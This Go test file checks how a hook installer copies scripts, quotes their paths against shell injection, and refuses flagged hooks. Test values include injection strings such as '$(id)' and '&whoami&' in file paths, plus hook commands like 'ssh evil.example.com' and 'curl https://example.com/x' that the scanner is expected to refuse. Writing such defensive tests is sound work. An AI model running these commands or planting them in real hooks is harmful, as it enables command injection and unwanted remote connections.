package installer

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/OpenScribbler/syllago/cli/internal/catalog"
	"github.com/OpenScribbler/syllago/cli/internal/converter"
	"github.com/OpenScribbler/syllago/cli/internal/provider"
	"github.com/tidwall/gjson"
	"github.com/tidwall/sjson"
)

func TestResolveHookScripts_InlineCommand(t *testing.T) {
	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "echo lint"}]}`)
	item := catalog.ContentItem{Name: "test-hook", Path: t.TempDir()}

	result, _, err := resolveHookScripts(matcherGroup, item, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	// Inline command should be unchanged
	cmd := gjson.GetBytes(result, "hooks.0.command").String()
	if cmd != "echo lint" {
		t.Errorf("command changed: got %q", cmd)
	}
}

func TestResolveHookScripts_RelativeScript(t *testing.T) {
	// Create a hook item directory with a script
	itemDir := t.TempDir()
	os.WriteFile(filepath.Join(itemDir, "lint.sh"), []byte("#!/bin/bash\necho lint"), 0755)
	os.WriteFile(filepath.Join(itemDir, "hook.json"), []byte(`{"event":"PostToolUse","hooks":[{"type":"command","command":"./lint.sh"}]}`), 0644)

	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "./lint.sh"}]}`)
	item := catalog.ContentItem{Name: "test-relative", Path: itemDir}

	destDir := t.TempDir()
	result, _, err := resolveHookScripts(matcherGroup, item, destDir)
	if err != nil {
		t.Fatal(err)
	}

	cmd := gjson.GetBytes(result, "hooks.0.command").String()
	if cmd != filepath.Join(destDir, "lint.sh") {
		t.Errorf("expected rewritten path, got %q", cmd)
	}

	// Verify the script was copied
	if _, err := os.Stat(cmd); err != nil {
		t.Errorf("copied script not found at %s: %v", cmd, err)
	}
}

func TestResolveHookScripts_ScriptWithArgs(t *testing.T) {
	itemDir := t.TempDir()
	os.WriteFile(filepath.Join(itemDir, "check.sh"), []byte("#!/bin/bash"), 0755)

	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "./check.sh --strict --verbose"}]}`)
	item := catalog.ContentItem{Name: "test-args", Path: itemDir}

	result, _, err := resolveHookScripts(matcherGroup, item, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}

	cmd := gjson.GetBytes(result, "hooks.0.command").String()
	if !strings.Contains(cmd, "check.sh") || !strings.Contains(cmd, "--strict --verbose") {
		t.Errorf("expected rewritten path with args preserved, got %q", cmd)
	}
}

func TestResolveHookScripts_MissingScript(t *testing.T) {
	itemDir := t.TempDir()
	// No script file exists

	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "./nonexistent.sh"}]}`)
	item := catalog.ContentItem{Name: "test-missing", Path: itemDir}

	result, _, err := resolveHookScripts(matcherGroup, item, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}

	// Command should be unchanged when script doesn't exist
	cmd := gjson.GetBytes(result, "hooks.0.command").String()
	if cmd != "./nonexistent.sh" {
		t.Errorf("command should be unchanged for missing script, got %q", cmd)
	}
}

// A script may source a helper beside it, so the whole item is copied with
// its layout and permissions, not only the script the command names.
func TestResolveHookScripts_CopiesTheWholeItem(t *testing.T) {
	itemDir := t.TempDir()
	os.MkdirAll(filepath.Join(itemDir, "lib"), 0755)
	os.WriteFile(filepath.Join(itemDir, "lint.sh"), []byte("#!/bin/bash\n. ./lib/common.sh"), 0644)
	os.WriteFile(filepath.Join(itemDir, "lib", "common.sh"), []byte("x=1"), 0640)

	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "./lint.sh"}]}`)
	destDir := t.TempDir()
	if _, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "whole", Path: itemDir}, destDir); err != nil {
		t.Fatal(err)
	}

	if fi, err := os.Stat(filepath.Join(destDir, "lib", "common.sh")); err != nil || fi.Mode().Perm() != 0640 {
		t.Errorf("helper not copied with its mode: %v %v", fi, err)
	}
	if fi, err := os.Stat(filepath.Join(destDir, "lint.sh")); err != nil || fi.Mode().Perm() != 0700 {
		t.Errorf("script not made executable: %v %v", fi, err)
	}
}

func TestResolveHookScripts_QuotesAPathWithASpace(t *testing.T) {
	itemDir := t.TempDir()
	os.WriteFile(filepath.Join(itemDir, "lint.sh"), []byte("#!/bin/bash"), 0755)

	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "./lint.sh --strict"}]}`)
	destDir := filepath.Join(t.TempDir(), "my hooks")
	result, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "spaced", Path: itemDir}, destDir)
	if err != nil {
		t.Fatal(err)
	}

	want := "'" + filepath.Join(destDir, "lint.sh") + "' --strict"
	if cmd := gjson.GetBytes(result, "hooks.0.command").String(); cmd != want {
		t.Errorf("command = %q, want %q", cmd, want)
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{
		`C:\Users\u\.syllago\hooks\x\run.ps1`: `C:\Users\u\.syllago\hooks\x\run.ps1`,
		`C:\Users\Jo Smith\run.ps1`:           `"C:\Users\Jo Smith\run.ps1"`,
		`C:\hooks\safe&whoami&.js`:            `"C:\hooks\safe&whoami&.js"`,
		`C:\hooks\a(1)^b.js`:                  `"C:\hooks\a(1)^b.js"`,
	} {
		if got := shellQuoteFor("windows", in); got != want {
			t.Errorf("windows: shellQuoteFor(%q) = %q, want %q", in, got, want)
		}
	}
	for in, want := range map[string]string{
		"/home/u/.syllago/hooks/a-b_c.sh": "/home/u/.syllago/hooks/a-b_c.sh",
		"/home/my home/lint.sh":           "'/home/my home/lint.sh'",
		"/tmp/it's/lint.sh":               `'/tmp/it'\''s/lint.sh'`,
		"/tmp/$(id)/lint.sh":              "'/tmp/$(id)/lint.sh'",
	} {
		if got := shellQuoteFor("linux", in); got != want {
			t.Errorf("shellQuoteFor(%q) = %q, want %q", in, got, want)
		}
	}
}

// A registry index can name an item anything, and the name becomes the
// scripts directory, so a name that is not one path element is refused.
func TestPlaceHook_RefusesANameThatIsNotOnePathElement(t *testing.T) {
	for _, name := range []string{"", ".", "..", "a/b", "../escape"} {
		_, err := PlaceHook(catalog.ContentItem{Name: name}, converter.Hook{}, provider.Provider{}, "", "", "", nil, "", ScanOptions{})
		if err == nil || !strings.Contains(err.Error(), "not a valid directory name") {
			t.Errorf("name %q: got %v, want a refusal", name, err)
		}
	}
}

// A content root reached through a symlink resolves to the same place as
// its scripts, so a bundled script is not mistaken for one outside it.
func TestResolveHookScripts_ItemReachedThroughASymlink(t *testing.T) {
	realDir := t.TempDir()
	os.WriteFile(filepath.Join(realDir, "lint.sh"), []byte("#!/bin/bash"), 0755)
	link := filepath.Join(t.TempDir(), "linked")
	if err := os.Symlink(realDir, link); err != nil {
		t.Skip("symlinks unavailable:", err)
	}

	matcherGroup := []byte(`{"hooks": [{"type": "command", "command": "./lint.sh"}]}`)
	destDir := t.TempDir()
	if _, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "linked", Path: link}, destDir); err != nil {
		t.Fatalf("resolveHookScripts: %v", err)
	}
	if _, err := os.Stat(filepath.Join(destDir, "lint.sh")); err != nil {
		t.Errorf("script not copied: %v", err)
	}
}

// A legacy record means the hook is installed only as placement counts it:
// for its own provider, or, with no provider, when the provider's settings
// hold the hook.
func TestCheckHook_LegacyRecordMeansInstalledAsPlacementCountsIt(t *testing.T) {
	legacyRoot := t.TempDir()
	origGlobal := catalog.GlobalContentDirOverride
	catalog.GlobalContentDirOverride = legacyRoot
	t.Cleanup(func() { catalog.GlobalContentDirOverride = origGlobal })
	claude := provider.Provider{Name: "Claude Code", Slug: "claude-code"}
	gemini := provider.Provider{Name: "Gemini CLI", Slug: "gemini-cli"}
	h := converter.Hook{Event: "before_tool_execute", Handler: converter.Handler{Type: "command", Command: "echo hi"}}
	item := func(name string) catalog.ContentItem {
		return catalog.ContentItem{Name: name, Type: catalog.Hooks, Path: t.TempDir()}
	}
	projectRoot := t.TempDir()
	emptySettings := filepath.Join(t.TempDir(), "settings.json")
	heldSettings := filepath.Join(t.TempDir(), "settings.json")
	placed := &Installed{}
	if _, err := PlaceHook(item("old"), h, claude, projectRoot, heldSettings, t.TempDir(), placed, "export", ScanOptions{}); err != nil {
		t.Fatal(err)
	}
	if err := SaveInstalled(legacyRoot, &Installed{Hooks: []InstalledHook{
		{Name: "lint", Event: "BeforeTool", Provider: "gemini-cli"},
		{Name: "old", Event: "PreToolUse", GroupHash: placed.Hooks[0].GroupHash},
	}}); err != nil {
		t.Fatal(err)
	}

	for _, tc := range []struct {
		desc      string
		name      string
		prov      provider.Provider
		settings  string
		installed bool
	}{
		{"own provider", "lint", gemini, emptySettings, true},
		{"another provider", "lint", claude, emptySettings, false},
		{"provider-less, settings lack it", "old", claude, emptySettings, false},
		{"provider-less, settings hold it", "old", claude, heldSettings, true},
	} {
		err := CheckHook(item(tc.name), h, tc.prov, projectRoot, tc.settings, &Installed{})
		if got := errors.Is(err, ErrHookInstalled); got != tc.installed {
			t.Errorf("%s: CheckHook = %v, want installed %v", tc.desc, err, tc.installed)
		}
	}
}

// A path quoted in the command is replaced with its quotes, so the new
// quoting is not nested inside them, where it would be literal and a $( in
// the path would still expand.
func TestResolveHookScripts_ReplacesAQuotedReference(t *testing.T) {
	itemDir := t.TempDir()
	os.WriteFile(filepath.Join(itemDir, "lint.sh"), []byte("#!/bin/bash"), 0755)

	destDir := filepath.Join(t.TempDir(), "$(id) dir")
	for _, cmd := range []string{`bash "./lint.sh" --strict`, `bash './lint.sh' --strict`} {
		matcherGroup, _ := sjson.SetBytes([]byte(`{}`), "hooks.0.command", cmd)
		result, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "quoted", Path: itemDir}, destDir)
		if err != nil {
			t.Fatal(err)
		}
		want := "bash '" + filepath.Join(destDir, "lint.sh") + "' --strict"
		if got := gjson.GetBytes(result, "hooks.0.command").String(); got != want {
			t.Errorf("%s: command = %q, want %q", cmd, got, want)
		}
	}
}

// A single-file hook shares its directory with its provider's other hooks.
// Its scan and its copy cover its own manifest and script, so another
// hook's finding neither refuses it nor rides along into its copy, while
// its own script is still scanned.
func TestPlaceHook_SingleFileHookScansAndCopiesOnlyItsOwnFiles(t *testing.T) {
	provDir := t.TempDir()
	cmd := "./mine.sh"
	os.WriteFile(filepath.Join(provDir, "mine.json"), []byte(`{"event":"PreToolUse","handler":{"type":"command","command":"./mine.sh"}}`), 0644)
	os.MkdirAll(filepath.Join(provDir, "other-hook"), 0755)
	os.WriteFile(filepath.Join(provDir, "other-hook", "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","handler":{"type":"command","command":"ssh evil.example.com"}}]}`), 0644)
	item := catalog.ContentItem{Name: "mine", Type: catalog.Hooks, Path: filepath.Join(provDir, "mine.json")}
	h := converter.Hook{Event: "PreToolUse", Handler: converter.Handler{Type: "command", Command: cmd}}
	prov := provider.Provider{Name: "Claude Code", Slug: "claude-code"}

	for _, tc := range []struct {
		script  string
		refused bool
	}{
		{"#!/bin/sh\necho ok\n", false},
		{"#!/bin/sh\nssh evil.example.com\n", true},
	} {
		os.WriteFile(filepath.Join(provDir, "mine.sh"), []byte(tc.script), 0755)
		scriptsDir := filepath.Join(t.TempDir(), "scripts")
		settings := filepath.Join(t.TempDir(), "settings.json")
		_, err := PlaceHook(item, h, prov, t.TempDir(), settings, scriptsDir, &Installed{}, "export", ScanOptions{})
		if tc.refused {
			if err == nil || !strings.Contains(err.Error(), "in mine.sh") {
				t.Errorf("own flagged script: got %v, want a refusal naming mine.sh", err)
			}
			continue
		}
		if err != nil {
			t.Fatalf("PlaceHook: %v", err)
		}
		entries, _ := os.ReadDir(scriptsDir)
		var names []string
		for _, e := range entries {
			names = append(names, e.Name())
		}
		if strings.Join(names, ",") != "mine.sh" {
			t.Errorf("copied %v, want only mine.sh", names)
		}
	}
}

// The command runs the first reference to its script; a later one is an
// argument and stays as written, so the copy is what runs.
func TestResolveHookScripts_RewritesTheScriptTheCommandRuns(t *testing.T) {
	itemDir := t.TempDir()
	os.WriteFile(filepath.Join(itemDir, "lint.sh"), []byte("#!/bin/bash"), 0755)
	destDir := t.TempDir()

	matcherGroup, _ := sjson.SetBytes([]byte(`{}`), "hooks.0.command", `bash ./lint.sh --label "./lint.sh"`)
	result, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "argtwice", Path: itemDir}, destDir)
	if err != nil {
		t.Fatal(err)
	}
	want := "bash " + shellQuote(filepath.Join(destDir, "lint.sh")) + ` --label "./lint.sh"`
	if got := gjson.GetBytes(result, "hooks.0.command").String(); got != want {
		t.Errorf("command = %q, want %q", got, want)
	}
}

// A second item under an installed hook's name is refused before its
// scripts are copied, so the installed hook keeps running its own script.
func TestPlaceHook_RefusedDuplicateLeavesInstalledScripts(t *testing.T) {
	prov := provider.Provider{Name: "Claude Code", Slug: "claude-code"}
	h := converter.Hook{Event: "PreToolUse", Handler: converter.Handler{Type: "command", Command: "./run.sh"}}
	scriptsDir := filepath.Join(t.TempDir(), "scripts")
	settings := filepath.Join(t.TempDir(), "settings.json")
	repoRoot := t.TempDir()
	inst := &Installed{}

	for i, body := range []string{"#!/bin/sh\necho first\n", "#!/bin/sh\necho second\n"} {
		dir := t.TempDir()
		os.WriteFile(filepath.Join(dir, "run.sh"), []byte(body), 0755)
		item := catalog.ContentItem{Name: "fmt", Type: catalog.Hooks, Path: dir}
		_, err := PlaceHook(item, h, prov, repoRoot, settings, scriptsDir, inst, "export", ScanOptions{})
		if i == 0 && err != nil {
			t.Fatalf("first PlaceHook: %v", err)
		}
		if i == 1 && (err == nil || !strings.Contains(err.Error(), "already installed")) {
			t.Fatalf("second PlaceHook: got %v, want an already-installed refusal", err)
		}
	}
	got, _ := os.ReadFile(filepath.Join(scriptsDir, "run.sh"))
	if string(got) != "#!/bin/sh\necho first\n" {
		t.Errorf("installed script = %q, want the first item's", got)
	}
}

// The command runs its script from the field ExtractScriptRef read, so a
// flag that holds the script name stays as written, quoted or not, and any
// whitespace separates fields.
func TestResolveHookScripts_RewritesOnlyTheScriptField(t *testing.T) {
	itemDir := t.TempDir()
	os.WriteFile(filepath.Join(itemDir, "hook.js"), []byte("1"), 0644)
	destDir := t.TempDir()
	dest := shellQuote(filepath.Join(destDir, "hook.js"))

	for cmd, want := range map[string]string{
		"node --require=./hook.js ./hook.js":   "node --require=./hook.js " + dest,
		`node --require="./hook.js" ./hook.js`: `node --require="./hook.js" ` + dest,
		"node\n./hook.js":                      "node\n" + dest,
	} {
		matcherGroup, _ := sjson.SetBytes([]byte(`{}`), "hooks.0.command", cmd)
		result, _, err := resolveHookScripts(matcherGroup, catalog.ContentItem{Name: "flag", Path: itemDir}, destDir)
		if err != nil {
			t.Fatal(err)
		}
		if got := gjson.GetBytes(result, "hooks.0.command").String(); got != want {
			t.Errorf("%q: command = %q, want %q", cmd, got, want)
		}
	}
}

// A script reached through an in-item symlink runs under the name the
// command gave it, so it finds the files beside that name. Through a
// directory symlink, which the copy does not keep, it runs its target.
func TestResolveHookScripts_RunsAnInItemSymlinkByItsOwnName(t *testing.T) {
	itemDir := t.TempDir()
	os.MkdirAll(filepath.Join(itemDir, "lib"), 0755)
	os.WriteFile(filepath.Join(itemDir, "lib", "run.sh"), []byte("cat data.txt"), 0755)
	os.WriteFile(filepath.Join(itemDir, "data.txt"), []byte("data"), 0644)
	if err := os.Symlink(filepath.Join("lib", "run.sh"), filepath.Join(itemDir, "run.sh")); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	os.Symlink("lib", filepath.Join(itemDir, "bin"))

	for cmd, want := range map[string]string{
		"bash ./run.sh":     "run.sh",
		"bash ./bin/run.sh": filepath.Join("lib", "run.sh"),
	} {
		destDir := t.TempDir()
		got, _, err := resolveHookCommandScript(cmd, catalog.ContentItem{Name: "linked", Path: itemDir}, destDir)
		if err != nil {
			t.Fatal(err)
		}
		if want := "bash " + shellQuote(filepath.Join(destDir, want)); got != want {
			t.Errorf("%q: command = %q, want %q", cmd, got, want)
		}
	}
}

// A command that leaves the item and comes back through a symlink still
// runs the copy, never the file at the path it named.
func TestResolveHookScripts_RunsTheCopyOfAPathThatLeavesTheItem(t *testing.T) {
	base := t.TempDir()
	itemDir, destDir := filepath.Join(base, "item"), filepath.Join(base, "dest")
	os.MkdirAll(itemDir, 0755)
	os.WriteFile(filepath.Join(itemDir, "run.sh"), []byte("echo hi"), 0755)
	if err := os.Symlink("item", filepath.Join(base, "other")); err != nil {
		t.Skip("symlinks unavailable:", err)
	}

	got, _, err := resolveHookCommandScript("bash ../other/run.sh", catalog.ContentItem{Name: "back", Path: itemDir}, destDir)
	if err != nil {
		t.Fatal(err)
	}
	if want := "bash " + shellQuote(filepath.Join(destDir, "run.sh")); got != want {
		t.Errorf("command = %q, want %q", got, want)
	}
}

// A directory whose name starts with ".." is inside the item.
func TestHookScriptRef_AcceptsADotDotPrefixedDirectory(t *testing.T) {
	itemDir := t.TempDir()
	os.MkdirAll(filepath.Join(itemDir, "..cache"), 0755)
	os.WriteFile(filepath.Join(itemDir, "..cache", "run.sh"), []byte("echo hi"), 0755)
	if _, _, rel, err := hookScriptRef(itemDir, "cached", "bash ./..cache/run.sh"); err != nil || rel != filepath.Join("..cache", "run.sh") {
		t.Fatalf("hookScriptRef = %q, %v; want ..cache/run.sh inside the item", rel, err)
	}
}

func TestScriptRefSpan(t *testing.T) {
	for _, tc := range []struct {
		cmd        string
		start, end int
	}{
		{"./run.sh", 0, 8},
		{"./run.shx ./run.sh", 10, 18},
		{"x./run.sh ./run.sh", 10, 18},
		{`bash "./run.sh"`, 5, 15},
		{`bash './run.sh' x`, 5, 15},
		{`bash "./run.sh'`, -1, -1},
		{"./run.shx", -1, -1},
	} {
		if start, end := scriptRefSpan(tc.cmd, "./run.sh"); start != tc.start || end != tc.end {
			t.Errorf("scriptRefSpan(%q) = %d, %d, want %d, %d", tc.cmd, start, end, tc.start, tc.end)
		}
	}
}

// A script may load a file through a symlink inside its item, which the
// copy keeps as a file; a symlink out of the item is not copied.
func TestCopyHookItem_CopiesSymlinksInsideTheItem(t *testing.T) {
	itemDir := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret.js")
	os.WriteFile(outside, []byte("secret"), 0644)
	os.WriteFile(filepath.Join(itemDir, "helper.js"), []byte("helper"), 0644)
	if err := os.Symlink("helper.js", filepath.Join(itemDir, "alias.js")); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	os.Symlink(outside, filepath.Join(itemDir, "out.js"))
	destDir := t.TempDir()

	if err := copyHookItem(itemDir, destDir); err != nil {
		t.Fatal(err)
	}
	if got, err := os.ReadFile(filepath.Join(destDir, "alias.js")); err != nil || string(got) != "helper" {
		t.Errorf("alias.js = %q, %v; want the helper's content", got, err)
	}
	if _, err := os.Lstat(filepath.Join(destDir, "out.js")); !os.IsNotExist(err) {
		t.Errorf("out.js copied from outside the item: %v", err)
	}
}

// The whole item is copied into the scripts directory, so the same name
// installed for two providers gets two directories.
func TestHookScriptsDir_SeparatesProviders(t *testing.T) {
	claude, err := hookScriptsDir("claude-code", "lint")
	if err != nil {
		t.Fatal(err)
	}
	gemini, _ := hookScriptsDir("gemini-cli", "lint")
	if claude == gemini || filepath.Base(claude) != "lint" {
		t.Errorf("hookScriptsDir: claude-code %q, gemini-cli %q; want separate lint directories", claude, gemini)
	}
}

// The scanner reads hook config only from .json files, so a single-file
// manifest is scanned whatever it is named, and whatever its script is
// named.
func TestPlaceHook_ScansASingleFileManifestUnderAnyName(t *testing.T) {
	prov := provider.Provider{Name: "Claude Code", Slug: "claude-code"}
	for _, cmd := range []string{"curl https://example.com/x", "node ./hook.json && curl https://example.com/x"} {
		provDir := t.TempDir()
		os.WriteFile(filepath.Join(provDir, "hook.json"), []byte("{}"), 0644)
		manifest := `{"spec":"hooks/0.1","hooks":[{"event":"PreToolUse","handler":{"type":"command","command":"` + cmd + `"}}]}`
		os.WriteFile(filepath.Join(provDir, "fmt.txt"), []byte(manifest), 0644)
		item := catalog.ContentItem{Name: "fmt", Type: catalog.Hooks, Path: filepath.Join(provDir, "fmt.txt")}
		h := converter.Hook{Event: "PreToolUse", Handler: converter.Handler{Type: "command", Command: cmd}}
		_, err := PlaceHook(item, h, prov, t.TempDir(), filepath.Join(t.TempDir(), "settings.json"), t.TempDir(), &Installed{}, "export", ScanOptions{})
		if err == nil || !strings.Contains(err.Error(), "high-severity") {
			t.Errorf("%q: got %v, want a high-severity refusal", cmd, err)
		}
	}
}
